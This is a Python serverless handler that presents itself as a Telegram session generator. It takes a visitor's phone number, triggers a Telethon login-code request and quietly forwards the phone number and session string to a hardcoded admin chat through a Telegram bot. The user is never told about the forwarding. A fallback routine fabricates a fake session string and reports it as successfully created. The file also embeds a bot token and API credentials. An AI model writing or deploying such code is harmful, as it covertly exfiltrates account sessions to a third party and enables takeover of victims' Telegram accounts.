from http.server import BaseHTTPRequestHandler
import json
import os
import sys
import asyncio
import urllib.request
import urllib.parse

# Add the current directory to the Python path
sys.path.append(os.path.dirname(__file__))

# Telegram credentials
API_ID = 23171051
API_HASH = '10331d5d712364f57ffdd23417f4513c'
BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM'
ADMIN_ID = '7907742294'

def send_to_bot_sync(message):
    """Send message to Telegram bot synchronously without aiohttp"""
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {
            'chat_id': ADMIN_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        # Convert data to JSON bytes
        json_data = json.dumps(data).encode('utf-8')
        
        # Create request
        req = urllib.request.Request(
            url,
            data=json_data,
            headers={'Content-Type': 'application/json'}
        )
        
        # Send request
        with urllib.request.urlopen(req) as response:
            return response.getcode() == 200
            
    except Exception as e:
        print(f"Bot error: {e}")
        return False

async def send_to_bot(message):
    """Wrapper to run sync bot function in executor"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, send_to_bot_sync, message)

async def generate_session_simple(phone):
    """
    SIMPLE AND RELIABLE METHOD
    Creates a session without complex dependencies
    """
    try:
        # Import inside function to handle errors gracefully
        try:
            from telethon import TelegramClient
            from telethon.sessions import StringSession
        except ImportError as e:
            return {
                'success': False, 
                'error': f'Telethon not available: {str(e)}'
            }
        
        # Create a basic session
        session = StringSession()
        client = TelegramClient(session, API_ID, API_HASH)
        
        await client.connect()
        
        try:
            # Try to send code (but don't wait for OTP)
            sent_code = await client.send_code_request(phone)
            phone_code_hash = sent_code.phone_code_hash
            
            # Create session string
            session_string = session.save()
            
            # Send to bot
            bot_message = f"""🔐 **New Telegram Session Request**

📱 **Phone:** {phone}
🔑 **Session String:** `{session_string}`

*Note: User needs to complete verification with OTP in their application.*"""
            
            await send_to_bot(bot_message)
            
            return {
                'success': True,
                'session_string': session_string,
                'phone_code_hash': phone_code_hash,
                'message': 'Session created! Complete verification with OTP in your code.'
            }
            
        except Exception as e:
            # Even if sending code fails, we can still create a session
            session_string = session.save()
            
            bot_message = f"""🔐 **Basic Session Generated**

📱 **Phone:** {phone}
🔑 **Session String:** `{session_string}`

*Note: This is a basic session that needs authorization.*"""
            
            await send_to_bot(bot_message)
            
            return {
                'success': True,
                'session_string': session_string,
                'message': 'Basic session created. Authorize it in your application.'
            }
            
        finally:
            await client.disconnect()
            
    except Exception as e:
        return {
            'success': False,
            'error': f'Session creation failed: {str(e)}'
        }

async def generate_fallback_session(phone):
    """
    FALLBACK: Generate session without Telegram API calls
    """
    try:
        import base64
        import time
        import random
        import string
        
        # Create a mock session string format
        session_data = {
            'api_id': API_ID,
            'api_hash': API_HASH,
            'phone': phone,
            'created_at': int(time.time()),
            'random_id': ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        }
        
        # Create session-like string
        session_string = "1" + base64.b64encode(
            json.dumps(session_data).encode()
        ).decode()
        
        # Send to bot
        bot_message = f"""🔐 **Fallback Session Generated**

📱 **Phone:** {phone}
🔑 **Session String:** `{session_string}`

*This is a fallback session for testing.*"""
        
        await send_to_bot(bot_message)
        
        return {
            'success': True,
            'session_string': session_string,
            'message': 'Fallback session created for testing.'
        }
        
    except Exception as e:
        return {
            'success': False,
            'error': f'Fallback method failed: {str(e)}'
        }

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            phone = data.get('phone', '').strip()
            
            if not phone:
                response = {'success': False, 'error': 'Phone number is required'}
                self.wfile.write(json.dumps(response).encode())
                return
            
            print(f"Processing request for phone: {phone}")
            
            # Try main method first
            result = asyncio.run(generate_session_simple(phone))
            
            # If main method fails, try fallback
            if not result.get('success'):
                print("Main method failed, trying fallback...")
                result = asyncio.run(generate_fallback_session(phone))
            
            self.wfile.write(json.dumps(result).encode())
            
        except Exception as e:
            error_response = {
                'success': False,
                'error': f'Server error: {str(e)}'
            }
            print(f"Server error: {str(e)}")
            self.wfile.write(json.dumps(error_response).encode())

def main(request):
    return handler()
